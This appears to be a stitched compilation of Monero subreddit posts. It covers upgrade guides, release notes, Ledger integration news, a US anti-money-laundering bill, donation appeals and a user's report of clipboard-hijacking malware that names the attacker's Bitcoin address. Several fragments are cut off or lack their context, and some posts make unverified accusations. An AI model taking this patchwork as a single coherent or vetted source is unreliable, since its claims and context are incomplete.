*You can optionally choose a very large, unusual ringsize to make the transaction stick out. This is not recommended, and normal users who leave the ringsize at the default setting will not experience any issues. Also, it's possible for a user to manually add identifying information to the tx_extra field, which is something that a user must seriously go out of their way to do."
"On November 28, 2017, the US Senate, Committee of the Judiciary held a hearing regarding bill S.1241: Modernizing AML Laws to Combat Money Laundering and Terrorist Financing. Despite little attention being given to digital currencies during the hearing, bill S.1241 itself would amend the definition of ‘financial institution’ in the United States Code to include digital currencies and digital exchanges. This could have alarming consequences for users of cryptocurrencies both in the US and abroad.

Bill S.1241 would amend the definition of ‘financial institution,’ in Section 5312(a) of title 31, United States Code, to include “an issuer, redeemer, or cashier of prepaid access devices, digital currency, or any digital exchanger or tumbler of digital currency.” Currently, the definition of ‘financial institution’ includes banks, trust companies, credit unions, currency exchanges, etc.

In her introduction, Mrs. Feinstein, Ranking Member of the Judiciary Committee, said (31:35), “The bill criminalizes intentionally concealing ownership or control of a bank account.” Although, during the hearing, no further clarifications were given as to the effects this would have on the cryptocurrency community, based on the amended definition of ‘financial institution’, it seems clear enough that the bill would “criminalize [those] intentionally concealing ownership or control of a [digital currency or digital exchange] account.” Wow. Let this sink in for a minute…

The US senate is proposing a bill to make criminals out of anyone intentionally concealing ownership or control of a digital currency or digital exchange account. What’s more, according to the hearing’s prolonged discussion of US law enforcement’s handling of foreign banks and financial institutions, this bill is certain to have far-reaching effects on not only US citizens but the global community as a whole.

If the above statement describes you, it is strongly recommended that you watch the hearing with this new definition of ‘financial institution’ in mind. If you’ve already watched the hearing, watch it again, but this time replace all mentions of ‘banks and financial institutions’ with ‘digital currencies and digital exchanges.’ The implications are really rather alarming.

Interestingly enough, Ms. Kathryn Haun Rodriguez, a Coinbase Board of Directors Member, made absolutely no mention of digital currencies or digital exchanges in her testimony; nor was she asked any questions pertaining to these topics.

Conversely, in her July 2017 written testimony to the US House of Representatives Committee on Financial Services and Subcommittee on Terrorism and Illicit Finance, she stated that some users of digital currencies use them “to conceal and move illicit proceeds because of the perception that virtual currency is untraceable.”

Also in her prior written testimony, she stated that “the FinTech industry could be a very helpful partner to the government in addressing national security concerns;” that “investigators like digital footprints and that is exactly what digital currencies provide;” and that “of course, we can only follow the money to an individual or group if they used a Regulated exchange, one that follows basic AML/KYC laws.” Advertisement

Contrary to the bill itself, the hearing was noticeably lacking in references to cryptocurrencies; although there was some limited mention of such.

Ms. Klobuchar (2:16:58):

“Is this transition we’re seeing from cash to digital going to make it easier or harder for law enforcement to track these money laundering cases, and you think these drug cartels are gonna start going cash free, and what do you do about it?”
Mr. John A. Cassara (2:17:15):

“Senator, I’m just glad I had my career when I did because I don’t know what I’d do trying to follow the money when it comes to digital currencies, it’s extremely, extremely challenging…I think if you look at the metrics, the metrics suggest today [that] digital currencies are a small fraction of the threat that we face. That’s not to say it’s gonna be the case in 5-10 years from now. We’re right at a crossroads, and it’s going to be very, very interesting to see what goes forward.”
Due to the probable negative implications for the global cryptocurrency community, hopefully the interpretation of bill S.1241 in this article is proven incorrect; however, at this point, it seems fairly clear (at least to me, the author) that this is the intent behind the bill. If this is indeed the case, it will be the most recent attack on a growing list of State-backed attacks against the crypto-community.

Furthermore, from the noticeable lack of references made to digital currencies during the hearing, it would appear this bill is yet another underhanded attempt of the US Government to further erode global freedoms and civil liberties, which markedly began with the introduction of the Patriot Act, shortly after the 9/11 attacks.

As Tone Vayes mentioned, it would have been nice if Andreas Antonopoulos was there to impart some of the wisdom he shared with the Canadian Senate, on October 8, 2014.

Tone Vayes’ summation*: “It’s bad…I think it’s gonna end in a very confrontational way between Bitcoin—even Bitcoin holders and users—and the US Government.”

Jimmy Song’s summation*: “Yeah, the nice thing about laws is they take a long time…”

Indeed it will be “very, very interesting to see what goes forward.” If this bill passes, how many of you future criminals out there are still set on hodling?

*to be fair, neither had yet watched the entire hearing.

Alternatively, you can use the Github link:

**CLI:** https://github.com/monero-project/monero/releases/tag/v0.12.0.0

**GUI:** https://github.com/monero-project/monero-gui/releases/tag/v0.12.0.0 

--------------  

**Note that this is a scheduled and consensual network upgrade. Thus, unlike the BCH / BTC split, a new coin *won't* be created.**  

-------------  

# General information about the scheduled network upgrade  

Approximately the 6th of April there will be a scheduled network upgrade on the Monero network. To be sufficiently prepared, a user, service, merchant, pool operator, or exchange should run CLI v0.12.0.0 or GUI v0.12.0.0. The scheduled network upgrade introduces two major changes. First, a PoW tweak to curb any potential threat of ASICs and preserve ASIC resistance. As a result, miners will have to update their miners (i.e. mining software). Second, the minimum ring size is bumped to 7 (mixin 6). Therefore, pool operators need to ensure that payouts use a minimum ring size of 7 (mixin 6), otherwise they will get rejected by the network.

More information about the PoW tweak can be found here:

https://getmonero.org/2018/02/11/PoW-change-and-key-reuse.html

https://github.com/monero-project/monero/pull/3253

In addition, more information about the minimum ring size bump can be found [here](https://github.com/monero-project/monero/issues/3035). Lastly, both changes have been discussed extensively in the last few dev meetings, which can be read here:

Due to variance the scheduled network upgrade will take place on or around the 6th of April. There is, however, no specific date as the hard fork will be triggered by a specific blockheight. The specific blockheight for the hardfork can be found [here](https://github.com/monero-project/monero/blob/master/src/cryptonote_core/blockchain.cpp#L110-L111). That is:  

> // version 7 starts from block 1546000, which is on or around the 6th of April, 2018. Fork time finalised on 2018-03-17.

# How do I upgrade?  

First and foremost, we encourage users to check the integrity of the binaries and verify that they were signed by Fluffypony's GPG key. A guide that walks you through this process can be found [here](https://github.com/qubenix/monero-site/blob/7edf03f77d4c4e9fcd11bfd3de68440e5322279b/_i18n/en/resources/user-guides/verification-windows-beginner.md) for Windows and [here](https://github.com/qubenix/monero-documentation/blob/qubenix-verify/binary-verification.md) for Linux and Mac OS X. 

**CLI:**  // Windows 32-bit, ARMv8, DragonflyBSD, and FreeBSD binaries are forthcoming

If you are using the CLI you ought to perform the following steps:  

1. Download the new binaries (the `.zip` file (Windows) or the `tar.bz2` file (Mac OS X and Linux)) from [the official website](https://getmonero.org/downloads/) or [Github](https://github.com/monero-project/monero/releases/tag/v0.12.0.0).

2. Extract the new binaries to a new directory of your liking.  

3. Copy over the wallet files from the old directory (the one that contains the v0.11.0.0 or v0.11.1.0 binaries).  

Note that a blockchain resync is **not** needed. Thus, if you open `monerod-v.0.12.0.0`, it will simply pick up where it left off.  

**GUI:** // Linux 32-bit binaries are forthcoming

If you are using the GUI you ought to perform the following steps:  

1. Download the new binaries from [the official website](https://getmonero.org/downloads/) or [Github](https://github.com/monero-project/monero-gui/releases/tag/v0.12.0.0).

2. Extract the new binaries to a new directory of your liking.  

3. Open `monero-wallet-gui`^1. It should automatically load your ""old"" wallet and you should be set for the upcoming scheduled network upgrade.  

(1) On Linux you ought to start the GUI with the `start-gui.sh` script, i.e., `./start-gui.sh`.  

**Paper wallet:**  

You don't have to do anything. However, if you want to restore a wallet after the scheduled network upgrade, you need to use the new binaries.  

**MyMonero:**  

You don't have to do anything, as MyMonero will be properly upgraded in advance of the scheduled network upgrade.  

**Mobile wallets:**

Its presumed that the third-party mobile wallets (Monerujo, Cake, and Xwallet) will release a new version in advance of the scheduled network upgrade such that the user is sufficiently prepared. Basically, their new version has to use ring size 7 as minimum default, otherwise users will get their transactions rejected. 

**Solo mining:**  

This process is similar to the CLI upgrade process. Thus, see aforementioned CLI steps.  

**Pool mining:**  

Your pool operator should upgrade to the new version. In addition, you should update your mining software to the latest version (the one that includes code to accommodate the PoW tweak).  

# A call for community action

It's in our best interest that the upcoming scheduled network upgrade transits as smoothly as possible. Therefore, it is imperative that we, as community, contact economically sensitive nodes (exchanges and services) and inform them about the new version, the upcoming scheduled network upgrade, and that they should run v0.12.0.0 to be sufficiently prepared. A list of exchanges that have integrated Monero can be found here:

https://coinmarketcap.com/currencies/monero/#markets

In addition, services that have integrated Monero are, for example, XMR.to, Evercoin, Shapeshift, and Changelly. 

Lastly, if you have any questions or need any assistance with upgrading, please leave a comment in this thread and the community and I will help you out. 

**EDIT April 4:** GUI binaries are released!

"While everyone is arguing whether Fluffy profited from a pump or dump I do want to say something about the dev team that everyone should consider. 

For a long time Monero code base had a bug in it that would have let anyone create anonymous coins. At any time the one who discovered the bug, the other people on the dev team that was aware of it, etc, could have created millions of coins out of thin air and sold down the market and making millions (tens of millions) in profit.

If the team was unethical, it would have been easy. Certainly, it would have had a big negative effect on Monero, but at that point the devs would have cashed out. Instead, the devs silently fixed this bug, verified it had never been exploited, and hard forked the network to ensure no one can use the bug.

That is a pretty standup dev team. A lot of people would find it hard to stay true to their morals in the face of a millions of dollars payout with no consequences. Just something to consider."
"This is just to formally note that we're investigating the unusually high number of complaints of theft on MyMonero over the last week. The majority of the cases of theft on MyMonero are related to phishing sites or malware, but there was an uptick in reports and Reddit posts towards the end of last week.

It would be irresponsible of us to disregard these or write them off as FUD, and so we are actively investigating the situation, and will update everyone as soon as we're done. In order to ensure that we don't miss anything, we are working with the good folk at [MWR InfoSecurity](https://www.mwrinfosecurity.com).

It would be greatly appreciated if people can be redirected to emailing support@mymonero.com instead of posting things up on Reddit, otherwise it's difficult to keep track of everything."
"The long awaited GUI v0.12.2.0 release, which includes indirect Ledger support, is finally here!

# Upgrading

You ought to perform the following steps:  

1. Download the new binaries (the `.zip` file (Windows) or the `tar.bz2` file (Mac OS X and Linux)) from aforementioned download links. 

2. Extract the new binaries to a new directory / folder of your liking. This is the easiest and recommended way. 

3. Open `monero-wallet-gui`^1. It should automatically load your ""old"" wallet^2.

(1) On Linux you ought to start the GUI with the `start-gui.sh` script, i.e., `./start-gui.sh`.  

(2) Note that you may have to reopen your wallet, which can be done with these instructions:

**[1a]** If you currently have a wallet / the GUI open, go to the `Settings` page and press `Close wallet`

**[1b]** If you yet have to start the GUI, press `Cancel` upon the GUI prompting for the wallet password. 

**[2]** On the second page of the wizard (first page is language selection) choose `Open a wallet from file`

**[3]** Now select your initial / original wallet. Note that, by default, the wallet files are located in `Documents\Monero\<wallet-name>` (Windows), `Users/<username>/Monero/<wallet-name>` (Mac OS X), or `home/<username>/Monero/<wallet-name>` (Linux).

Lastly, note that a blockchain resync is **not** needed, i.e., it will simply pick up where it left off.  

-------------------

# Brief release notes

The following critical bugs that were present in GUI v0.12.0.0 are fixed in GUI v0.12.2.0:

- On Linux, the GUI was, for a significant subset of users, unable connect to the daemon (`bad_cast` issue)
- On Windows, there was no proper graphic fallback (a significant subset of users had to use the `start-low-graphics-mode.bat` batch file)
- Lag issues introduced by the tracking feature

In addition to aforementioned salient bug fixes, there are a lot of small bug fixes and improvements. 

**Note that, on Linux, you may have to apply this guide:**

I don't know why I didn't do it sooner. I wonder if we can get them to take Monero donations?
"TLDR: Windows malware intercepts a BTC address copied to the clipboard so that the pasted address is different, diverting funds to the attackers wallet which has 8.8 BTC of transactions. It mangles an XMR address. **Visually inspect every transaction destination address before clicking OK**!

Update: **source for the malware found: a win32diskimager.exe downloaded from download.cnet.com**, of all places, with a total of 4,500 downloads. More in the update at the bottom of the post.

Update 3: u/gugap and colleagues posted a detailed analysis here:
https://www.welivesecurity.com/2018/03/14/stealing-bitcoin-download-com/

And great news that the file has been removed from CNET!

Original post:

I was setting up xmr-stak on my Windows desktop as the Linux version requires compiling which I'm not comfortable with. I was getting invalid address errors from the pool with two different wallet addresses, and I knew one of them is a good address with certainty having done transactions with it in the past.

After further head-scratching I noticed that the XMR **address I copy from my password manager to the config file differs from the one that's pasted**! I didn't notice it as the beginning and end characters are the same; the substitution is in the middle. The substitution can be defeated easily by copy-pasting the address in two chunks. But it does substitute the incorrect address even when the address is part of a longer string, such as the entire config file.

The fact that it generates invalid addresses (every time?) made me suspect this attack is meant for some other coin, most likely Bitcoin. I tested with a few BTC and BCH addresses, and it indeed generates the same address every time (below). Possibly the XMR attack is a by-product for the hack searching for BTC address strings, and it spits out an address without destination when confronted with an XMR address. [edit: After doing some further checks, the malware seems to look for the first ""1"" in the address and substitutes it with his BTC address below. I just learned that (one type of) BTC address always starts with a ""1"", which confirms the theory.]

While I believe this only allows the attacker to divert BTC funds to his address and doesn't compromise my XMR wallet or private keys, I already created a new wallet on my Linux machine, and moved my funds there. Now I'm considering doing this for all my coins as who knows what other monsters lurk behind the SSDs...

I thought I run a pretty tight ship with my desktop and cryptos, and do most of my computing in Linux. I only install wallets linked from the official websites, and verify checksums. I had heard of such attacks before, and always double-check the pasted address when moving funds. Fortunately I didn't lose any money as I noticed this while setting up XMR mining.

Somehow this got to my computer, and I have to deal with it and tighten my controls. Now, is there a secure way to clean my computer, or should I re-install Windows completely?

Below sample outputs for XMR and BTC addresses:

Correct XMR address generated with moneroaddress.org, copied in two chunks:
466mBJsXq4k8n4aampbico1Mn3muVyiBJUpfmq4oGjmrMCP1ZuXCz69HfuHDpsT1BQZKqdp2CV3QV5nUEsqSg1ygegLmqRygj
Incorrect address when copy-pasting in one go, substitutions in bold, the address is different for each XMR address:
466mBJsXq4k8n4aampbico1**BQZKqdp2CV3QV5nUEsqSg1ygegLmqRygj**HDpsT1BQZKqdp2CV3QV5nUEsqSg1ygegLmqRygj

Another correct XMR address:
41BQZKqdp2CV3QV5nUEsqSg1ygegLmqRygjbRErDcCVrMLtZ5u1BQZKqdp2CV3QV5nUEsqSg1ygegLmqRygjiMQcTg

Incorrect address which differs from the previous one:
YmNRSAn6JQP7jNuWYieZEx1BQZKqdp2CV3QV5nUEsqSg1ygegLmqRygj
Correct Bitcoin address:
1GfyupfMmoNn9w9f9S7NQ6ouL1cgZW8MvM

Turns into this incorrect Bitcoin address, same address every time (at the time of writing it has 230 transactions worth 8.8 BTC). This BTC address is in the substitution in the XMR address above in bold.
1BQZKqdp2CV3QV5nUEsqSg1ygegLmqRygj

**ALWAYS visually check that the address you send to is actually the one you copied. Don't just skip past the withdrawal confirmation page on your exchange; double-check that it is identical to the one you intend to send funds to.**

**Update**:

Many have asked about the potential source. I know it's not an email as I don't use POP, and don't open attachments. Likely attack vectors are web ads, PDFs, or some crypto software I've installed recently. Haven't found the source, though.

For cleaning, F-Prot didn't find anything, Malwarebytes found the following and I quarantined them. After resetting twice my clipboard copies a Bitcoin address correctly. I will still re-install Windows completely just to be safe.

**Update 2**:

Thanks to u/gugap I found the source for the infection!

Step-by-step. I was doing a backup of one of my Raspbian installs a few weeks back, and downloaded Win32 Disk Imager from download.cnet.com:
http://download.cnet.com/s/win32-disk-imager/

I uploaded the file to VirusTotal, and got a scary list of suspicious items VirusTotal found in the file:

CAT-QuickHeal Trojan.IGENERIC Cylance

Endgame malicious (high confidence) ESET-NOD32

Fortinet MSIL/ClipBanker.DF!tr McAfee

McAfee-GW-Edition Artemis Sophos AV

TrendMicro-HouseCall Suspicious_GEN.F47V0119 VBA32

Seems like we found the source for McAfee's wealth j/k. Here the full report:
https://www.virustotal.com/#/file/7b3d52200895d02bee51fc03217088a383158494dcac5f570dd875cdd1f2f248/detection

F-Secure didn't recognize anything then or today. I downloaded again just now, and it's infected. I reran it through Malwarebytes as well and it doesn't detect malware, either, only after the payload has been delivered.

Thanks again to u/gugap and others for helping find the source! Given the source is a CNET site I had less reason to suspect it, so I don't feel like a total idiot.

On the other hand, it's pretty scary that 4,500 (!) people have downloaded that file in the past two years (!!), over three hundred in the past week alone! I reported the file to CNET.

Also, it is very difficult to avoid such malware if AV doesn't detect it, and it's coming from a legit site. Time to ditch Windows for good, and start using airgapped TAILS for working with private keys."

"Hi all,

Some news about ledger integration.

**The Good news**

On NanoS side, around 80% of  the application is developed.

On Client side, let's say 40% is done. The reverse math-engineering. But thanks to IRC #monero-research-lab (thanks moneromoo and knaccc), solution is on the way.
But instrumenting the code, making some tools for debug, analyzing math log...is time consuming, more than I believed when I started.

I pushed current code (minus some local experimentations...) under git

**The almost Bad news**

There is  a 'Soon(tm)' sound in the air. :D 

More seriously full alpha code is a little bit delayed, but don't worry, Monero integration is for now my priority at Ledger company.
(but not my only works ;)

A precision about alpha goal: have a correct transaction fully signed by the NanoS.
After that, the next dev will be the integration for balance computation and transaction tracking


**Final Note**

 Thanks for beer&pizza donation, you can continue ;) 
and keep smiling, we are working hard! :)

"Monero prevents criminals from seeing my finances and targeting me.

Monero prevents money that I obtain legally from being tainted by a criminal history

Monero prevents criminals from devaluing my hard earned money for their own gain

So yes, monero and criminals are closely intertwined. "

"If you're familiar with eCommerce, you're probably familiar with Shopify. Its a software service that makes DIY eCommerce stores super easy.

**All** FluffyPony's Coral Reef project stores were using Shopify. 

Essentially **Globee created a Shopify plugin** so that any Shopify store can accept XMR. And that's live and working.

They've got a neat [PDF](https://www.dropbox.com/s/34f9ld7q56aiwkb/Project%20Coral%20Reef_%20Enabling%20Monero%20Payments%20%28Shopify%29.pdf?dl=0) on how the integration works.

And to get started, you just need to fill in the form at the bottom of the [Project Coral Reef site](https://www.projectcoralreef.com). 

The only lengthy bit is if you want to cash out some/all of the XMR/BTC into $ - you need to go through Bitpay's KYC/AML procedure - which can take a couple days. (Globee piggybacks off Bitpay for this integration).

Globee doesn't replace a stores ability to accept Paypal/Debit/Credit - it runs alongside.

It would be really cool to have more stores signed up to accept Monero. 

For example, anyone wanting to utilise recent price increase gains, could simply buy something in XMR, rather than first having to cash out into fiat.

* The store I just signed up is [Hammock Universe](https://www.hammockuniverseusa.com) - who (unsurprisingly!) sell hammocks, hammock chairs, stands etc. They're not a fly by night company, they've been around since 2001 - and I've been working with them for the last 3 years.

* Am currently in the process of signing up my friends store who sell saunas ([Tranquility Saunas](http://tranquilitysauna.com)). Just waiting for Bitpays AML/KYC to get done.

Anyway, hopefully this is news to at least one person, **who might know a store they can sign up!**"
"Excellent news for Monero fans. This reduced the fee from approx $5 to $0.01

# Upgrading

You ought to perform the following steps:  

1. Download the new binaries (the `.zip` file (Windows) or the `tar.bz2` file (Mac OS X and Linux)) from aforementioned download links. 

2. Extract the new binaries to a new directory / folder of your liking. This is the easiest and recommended way. 

3. Open `monero-wallet-gui`^1. It should automatically load your ""old"" wallet^2^3.  

(1) On Linux you ought to start the GUI with the `start-gui.sh` script, i.e., `./start-gui.sh`.  

(2) If you started using the GUI from v0.12.2.0 on, you may have to reopen your wallet, which can be done with these instructions:

**[1a]** If you currently have a wallet / the GUI open, go to the `Settings` page and press `Close wallet`

**[1b]** If you yet have to start the GUI, press `Cancel` upon the GUI prompting for the wallet password. 

**[2]** On the second page of the wizard (first page is language selection) choose `Open a wallet from file`

**[3]** Now select your initial / original wallet. Note that, by default, the wallet files are located in `Documents\Monero\<wallet-name>` (Windows), `Users/<username>/Monero/<wallet-name>` (Mac OS X), or `home/<username>/Monero/<wallet-name>` (Linux).

(3) If you changed any settings in GUI *v0.12.2.0* or added a new ones, you may have to specify them again in GUI v0.12.3.0. 

Lastly, note that a blockchain resync is **not** needed, i.e., it will simply pick up where it left off.  

-------------------

# Brief release notes

- Direct Ledger support (i.e. ability to generate a Ledger Monero wallet with the GUI)
- Fixed the time-out issue (i.e. wallet not able to connect to daemon upon creating a transaction or wallet disconnecting during wallet refresh (with either a remote node or a local node))
- Fixed a bug where the settings where not migrated properly
- Fixed a freezing issue on the `Settings` page
- Fixed an UI/UX bug where the user, on the second page of the wizard, was nudged into selecting either the `Testnet` or the `Stagenet` box (and occasionally not being able to uncheck both of them)
- Some other bugfixes and performance improvements

"Hello everyone!


My name is Austin Garrido, and I am a scientist, explorer, and long time Monero user. I work to explore undocumented and endangered ecosystems to open them up to scientists and to bring to light the unique organisms that live there so that they can be protected. For several years, I worked in Panama to explore previously unknown cave systems and mountain ranges between the border of Panama and Colombia. I worked for an NGO which was protecting the most isolated cloud forest in central america, nestled a completely undocumented mountain range (the Mahe Massif, and [ADOPTA Panama Rainforest](www.chucanti.org) ), and for the last year I have done research for the Smithsonian Institution. In biology, I primarily study insects and fungus, but my passion is to find undiscovered or lost species in remote and unexplored territory and present them to the world. Last year I assisted in finding 5 new species of insects and amphibians.

My guiding belief is that we can not save what we don’t know about, and we can not protect what we don’t understand.
The main problem with science today is the “publish or die” mentality. Scientists can only get funding if they publish, and so they will much more often go for previously studied regions where the area and the goal is clear and easy to put in a proposal. One of the problems with this is that new and unexplored areas get neglected. So the same areas get studied over and over while unexplored ecosystems are ignored because they are unknown and seemingly intractable to someone with limited funding. Scientists don’t know how to get there or what they will find, so understandably, they go for the safer bet. What we need is someone who is willing and able to go into uncharted territory, document the process, and collect broad scientific data to make freely available to the world. Not only will this increase the study of these areas, but almost every area like this is under incredible danger of deforestation or pollution, and if nobody knows what is there, all of the countless new species there will disappear without a sound.

I have been an advocate of Monero for over 4 years now, and over the last few months, Monero has done spectacularly. I have taken advantage of my good fortune in the market to fund myself to another part of the world: Southeast Asia. The multitude of islands and biodiversity here is staggering. I set my sights on one of the largest and most endangered rainforests in the world: The heart of Borneo.

Deep inside the center of Borneo, I have located an unnamed and completely unexplored 14 sq mile plateau in the mountains at about 1800 meters in elevation (see it at 2.175717, 116.107885). This is one of the most isolated and untouched area in allof borneo. In 1923, a few dozen miles south of this plateau, there was a species of pitcher plant discovered on Mt. Kemul at a similar elevation. It was only seen once, and only a single sample of its leaves exist- its name is Nepenthes Mollis. This species was recently named one of the [25 most wanted Lost species on earth](https://lostspecies.org/). It was named this because of its uniqueness, and the opportunity it provides to help save this unique habitat. Borneo is one of the oldest and most biodiverse rainforests on earth, and it is [being destroyed faster than anywhere on earth](https://lh3.googleusercontent.com/-uU1q_zGFq60/WTrrKBqYWZI/AAAAAAAAYlI/kwUG0-oCGXMfZ7Lldz9f-ynDnpIDYQq5gCJoC/w1631-h1259/6%2Billegal%2Blogging%2Bchanges_in_forest_cover_borneo%2BbyWWFGermany.png). Species like N. Mollis help us call attention to these forests, and might just help us get the attention we need to save these last remaining chunks of virgin wilderness.


To get to this area, I have to travel to the middle of nowhere at the mouth of a very seldom explored river, hire a boat to take me 165 miles up river (through countless sets of huge rapids that we will somehow manage), where I will find an unknown tribe of Dayak based only off satellite images, who I hope to convince to help me carry food and supplies up several days hike into the cold and wet cloud forests of the plateau. There I will build a camp, and use it as a base to explore, document species of reptiles, insects, amphibians, and mammals that I encounter. I will stay there alone for four weeks. In this time, I will undoubtedly find many many new species, as these isolated and cold areas in rainforests tend to house many endemic animals that have been trapped there for millions of years.

This trip is completely funded by me, and Ive already spent more than $6,000 worth of monero on this trip, a sizable chunk of my net worth. I dont mind, really, this work is the most important thing in the world to me. But I have an idea:
If anybody wants to send funds to support this expedition, and future ones, I think it would be an excellent opportunity to increase public awareness of Monero. Of the new species discovered on this trip, I will make sure that some of them are named by the Monero community (maybe a vote?). And if (when!) I find the legendary Nepenthes Mollis, I will recognize Monero in the publications on the species discovered, and ensure that any press releases mention it. On top of this, Monero kind of has a reputation for being completely closed and shady, so I will use this opportunity to show the public how things like View-keys can be used to make Monero transparent. If I get any serious level of donations, I will make the wallet public, as well as posting each of my withdrawals and what purpose it is being used for. It is very, very important to me that this fund is used only for research purposes, and that everyone can see it happen. Monero is not just for total privacy- it’s for selective privacy, and this is a transparent project. This is an important factor that is not stressed, or really used by anyone major Ive seen so far, and i think it’s pivotal to moneros mainstream adoption.

All of my findings and results will be published online for everyone to use freely. We already have plans next year to take a much larger research team up there, including Dr. Peter Marting, an amazing field biologist who studies the variations in personalities of superorganisms like ant colonies. Future expeditions will always be to endangered and unexplored territory exclusively, usually tropical rainforest, and with a distinct aim to save the area and open it to scientific study.
I look forward to anyone who wishes to support me in this, but I also just want to thank this community for supporting and answering all my questions over the years! This is a 100% Monero funded operation- all my money is in Monero. 

And just so you know how real I am about this: I’m already in Borneo. It’s already happening. Arrived here a few weeks agok, and in less than 2 weeks time I will already be deep deep in the jungle! Any funds I receive I can use for hiring assistants for trailblazing, a better base camp, potentially being able to send back more samples, and maybe even getting things like game cameras. All of these things will make my time here infinitely more productive. If you can’t donate, there are lots of other things you can do to help this project and monero- I will need to sift through data, publish my findings in an accessible way, contact news outlets to let them know of this incredibly important project, and edit hours of video footage into something people can watch. PM me if you’d like to help with any of these!




I have an instagram called Pando_brain, which ive only started posting to for this trip. You can use that for confiriming who I am- I have several videos up showing how Im getting to the most remote area in Borneo!

"Finally 34c3 congress is over and we had a lot of fun at the Monero Assembly. However, among all the fun there have been some interesting presentations about Monero! One of the highlights was Michael's talk about the prototypes for our dedicated Hardware Wallet.

In short: It's happening! And probably the hardware will be ready for release in March / April. Unfortunately this doesn't mean it will be ready for use, since we'll still need to have the firmware / software developed for it.

You'll find some photos of the presentation here: https://imgur.com/a/SoMWC

The last picture shows Zooko visiting the Monero Assembly and being tagged with a Monero sticker to get finally on the right path ;)

And if you are more into details of the current development, feel free to track it on [Taiga](https://taiga.getmonero.org/project/michael-rfc-hwallet-1-implementation/)

Btw. the price for the Monero Hardware wallet will be probably around 10-20 USD according to Michael, so it might be a game changer if you compare it to the price of common hardware wallets..."
"Its pretty clear an exit scam is coming after the latest slew of complaints on reddit.

After blocking access to my XMR, and telling me all I needed to do was send them three photos, which I did plus a video, the scammers at Freewallet now tell me I have to provide a screenshot of my deposit transactions, which they already know cannot be done, since like so many people I used Shapeshift to get my Monero

They actually said to me, ""Show us a video of you logging into your Shapeshift account"".

What a joke. **NO ONE has a Shapeshift account**, as the u/freewallet_support scammers well know. An account is NOT needed or even suggested to use Shapeshift's service.

Freewallet does and says ANYTHING to make sure you cannot meet their bullsh\*t requirements. 

Whatever request from them you satisfy, they simply make up a new one until you cant satisfy it. There are other examples of that on reddit from Freewallet's victims.

**We have identified more than one individual already**. They arent nearly as hidden as they like to think

In addition to major legal action, Google and Apple are receiving court subpoenas.

I gave them what they asked for and they only asked for more. There is no more I can possibly provide to them. Its now up to Freewallet how much trouble they want to be in

u/freewallet_support picked the wrong guy to scam. Stay tuned"
"Here is a rundown of what seems to have happened. Some 24 hours ago, a lot of blocks with 1560 coins in them started appearing. Somebody produced lots of low-difficulty blocks which got accepted by the network and orphaned the legit blocks. In effect mining 10s of millions of coins without much effort (not a 51% attack). The devs were notified, but dismissed it as ""not being a problem"".
 
People trying to raise awareness on Reddit are being blocked, before the devs finally roll out a fix. Turns out they got that wrong and the free mining continues.
 
Meanwhile - Verge being Verge - the price in unaffected and the top story on their Reddit is a sponsored mentioning in Forbes!!!. Good times in Verge land.
 
To the Monero devs: thanks for pushing out quality code and responding well to issues.

"Hi all

Just performed a new push, here are the news:

**Status**

I found a workaround of point 1 of news #2, real things are still under investigation. The point 2 is totally solved.

What's new? I worked on transaction tracking and wallet restore.

A --generate-from-device command has been added. This option assumes the device is setup with your private view/spend keys and restore your wallet files in a secure way.

This implies that transaction are correctly identified and decoded using the device! :).

There is still a little part under development for making this part (almost?) finished: the computation of the chacha8 key for decrypting the cache wallet. It is not possible to make this fully on device. The idea it to only compute the initial state S = keccak1600(a|b|'8c'). Not so hard :).

Any comment on code is welcome and will be appreciate :)

**Next**

* Generate a,b private keys from 24 words mnemonics (test keys are hardcoded for now)
* Finish the cache wallet chacha8 key generation
* Make lot of test to see where device handling is missing
* Call the community to make test onto testnet

The most important question: WHEN?

I'am off next week and will have to work on Ledger OS for the next firmware release. So I will have to reduce my time on Monero in November, but don't worry any spare time will be used for Monero.

**Beer&Pizza**

I saw btchip and others last week. Was so cool!

Happy new Years"
"As I view the current cryptocurrency landscape, I am deeply saddened by the lack of insight on the part of users, investors, developers, and commentators as to what cryptocurrency actually is and where its value comes from. The cryptocurrency community has been distracted by useless ICO's, blockchain-based applications with contrived use cases, and the promise to get rich quick.


**Cryptocurrency came about to solve a single problem. It emerged from the solitary need for electronic cash.** A digital money to exchange assets between individuals across the Internet.


Bitcoin was an amazing first step towards electronic cash. A distributed network that recorded transactions on an immutable public ledger. Wow!


But there are serious issues with Bitcoin that degraded its usefulness as money. The same public ledger which allowed Bitcoin transactions to be recorded also left Bitcoin users without anonymity in their financial transactions. It failed to function as ""cash"" and became increasingly fraught with problems due to a lack of fungibility and increasing numbers of toxic coins.


This is where Monero enters the picture. Monero maintains the privacy of its users through an immutable blockchain which is totally opaque to the outside observer.  This simultaneously makes Monero fungible and private by default. This is big. Where Bitcoin failed over time, Monero was able to succeed quite remarkably in meeting our need for electronic cash.


**Monero has solved the world's need for electronic cash** and yet the world is nearly oblivious to its existence. There is so much talk of dapps, ICO's, bank-sponsored coins and the like, and yet the single most value-adding proposition of cryptocurrency is being ignored. I believe that there has been a failure to communicate the true value that Monero holds - both due to our inabilities as a community to drive this single point home, and by a lack of effective communication networks for allowing disruptive technologies to be presented to the broader public.


I'm coming to you all in a state of despair. What can I do, what can we all do, to show the world that the answer to one of their biggest problems has already been solved? It seems like the value of Monero is one of the world's best-kept secrets, but why should it be a secret?! Anyone can use Monero right now in a fully accessible manner to send and receive assets that maintain the characteristics of cash. Monero's usefulness was entrenched long before the developers improved accessibility of the software, aimed to reduce transaction sizes, and allowed more novel forms of transactions such as multisignature wallets.

Monero solved the world's need for electronic cash. Let the magnitude of that statement land. Now, how can we let others in on the world's best-kept secret? How can we communicate the remarkable value embodied within Monero?"

Ransom : 10 million euros in Monero

Wife gone for over 10 Weeks, News broke today.

"For whatever reasons we have all come to support Monero, I believe privacy is the most important factor behind its success and the biggest variable in its future value. Those with vested financial interests in Monero must also have vested interests in the continued protection of its privacy features. Ring-CT especially is a large part of what separates this coin from others in the crypto-sphere.

For this reason, Monero has most definitely caught the interest of law enforcement agencies; no three letter organization worth its salt can idly stand by while what amounts to grassroots money laundering proliferates under their watch. When the Wannacry hackers converted their BTC to XMR, authorities had to resort to extracting information through Shapeshift after it was stated the hackers violated their terms of service. This was a legitimate test for Monero's proof of concept, and it appears to have passed. However, it is impossible for me to believe this event has not increased the attention given to Monero by those who wish to compromise it.

